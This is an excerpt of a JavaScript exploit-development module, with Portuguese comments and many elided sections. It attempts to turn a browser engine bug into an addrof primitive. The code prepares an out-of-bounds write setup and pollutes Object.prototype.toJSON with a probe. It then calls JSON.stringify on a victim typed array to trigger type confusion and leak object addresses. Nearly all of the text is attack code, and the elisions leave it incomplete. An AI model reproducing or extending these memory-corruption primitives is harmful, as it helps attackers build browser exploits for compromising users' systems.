// js/script3/testArrayBufferVictimCrash.mjs (v50_StabilizeCall2)
...
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V50_SC2 = "OriginalHeisenbug_TypedArrayAddrof_v50_StabilizeCall2";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v50 = null;
let object_to_leak_B_v50 = null;

let victim_typed_array_ref_v50 = null;
let probe_call_count_v50 = 0;
let all_probe_interaction_details_v50 = [];
let first_call_details_object_ref_v50 = null; // Referência ao C1_details

const PROBE_CALL_LIMIT_V50 = 5;

function toJSON_TA_Probe_StabilizeCall2() {
    probe_call_count_v50++;
    const call_num = probe_call_count_v50;
    let current_call_details = { // Sempre criar um novo objeto de detalhes para esta chamada
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v50_StabilizeCall2",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v50),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v50 && first_call_details_object_ref_v50 !== null),
    ...
    try {
        if (call_num > PROBE_CALL_LIMIT_V50) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v50.push(current_call_details);
            return { recursion_stopped_v50: true, call: call_num };
        }
        ...
        if (call_num === 1 && current_call_details.this_is_victim) {
            ...
            first_call_details_object_ref_v50 = current_call_details; // Guarda a REFERÊNCIA para C1_details
            all_probe_interaction_details_v50.push(current_call_details);

            // --- NOVO: Tentar uma propriedade que force o JSON.stringify a revisitar este objeto ---
            // Uma referência circular simples pode ser o suficiente para manter o JSON.stringify "interessado"
            try {
                current_call_details.self_ref_to_force_visit = current_call_details;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Added self-reference to C1_details to encourage revisit.`, "info");
            } catch (e) {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Error adding self-reference: ${e.message}`, "warn");
            }
            // --- FIM DO NOVO ---

            return current_call_details; // Retorna o próprio objeto de detalhes da Call #1
        }
        // Caso 2: 'this' é um [object Object] (espera-se que seja o C1_details confuso)
            ...
            if (object_to_leak_A_v50) {
                this.payload_A = object_to_leak_A_v50;
                current_call_details.payload_A_assigned = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned object_to_leak_A_v50 to this.payload_A.`, "info");
            }
            if (object_to_leak_B_v50) {
                this.payload_B = object_to_leak_B_v50;
                current_call_details.payload_B_assigned = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned object_to_leak_B_v50 to this.payload_B.`, "info");
            }
        ...
        // Caso 3: Outras chamadas (não [object Object]), ou 'this' não é o esperado
            ...
            all_probe_interaction_details_v50.push(current_call_details);
            return { generic_marker_v50: call_num };
        }
        ...
        all_probe_interaction_details_v50.push(current_call_details);
        return { error_marker_v50: call_num };
    }
}

export async function executeTypedArrayVictimAddrofTest_StabilizeCall2() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V50_SC2}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (StabilizeCall2) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V50_SC2} Init...`;

    probe_call_count_v50 = 0;
    all_probe_interaction_details_v50 = [];
    victim_typed_array_ref_v50 = null;
    first_call_details_object_ref_v50 = null;

    // Inicializando os objetos simples para vazar
    object_to_leak_A_v50 = { marker_A_v50: "LeakMeA_SC2", idA: Date.now() };
    object_to_leak_B_v50 = { marker_B_v50: "LeakMeB_SC2", idB: Date.now() + Math.floor(Math.random() * 1000) };
    ...
    try {
        ...
        victim_typed_array_ref_v50 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v50.buffer);
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v50 (Uint8Array) created. Its buffer filled.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_StabilizeCall2, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v50)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v50);
            ...
            const relevantCall = all_probe_interaction_details_v50.find(d => d.this_type === '[object Object]' && d.payload_A_assigned);
            if (relevantCall) {
            ...
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.payload_A !== undefined) {
                ...
                } else if (payload_A_val && payload_A_val.marker_A_v50 === object_to_leak_A_v50.marker_A_v50) {
                    addrof_A_result.msg = `Payload A is object_to_leak_A_v50 directly (not numeric pointer).`;
                ...
                } else if (payload_B_val && payload_B_val.marker_B_v50 === object_to_leak_B_v50.marker_B_v50) {
                    addrof_B_result.msg = `Payload B is object_to_leak_B_v50 directly (not numeric pointer).`;
            ...
            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V50_SC2}: Addr SUCCESS!`;
            } else if (heisenbugConfirmed) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V50_SC2}: Heisenbug OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V50_SC2}: No Heisenbug?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V50_SC2}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
        ...
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V50_SC2} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v50}`, "info", FNAME_CURRENT_TEST);
        ...
        probe_call_count_v50 = 0;
        first_call_details_object_ref_v50 = null;
        object_to_leak_A_v50 = null;
        object_to_leak_B_v50 = null;
    }
    return {
        ...
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v50],
        total_probe_calls: probe_call_count_v50,
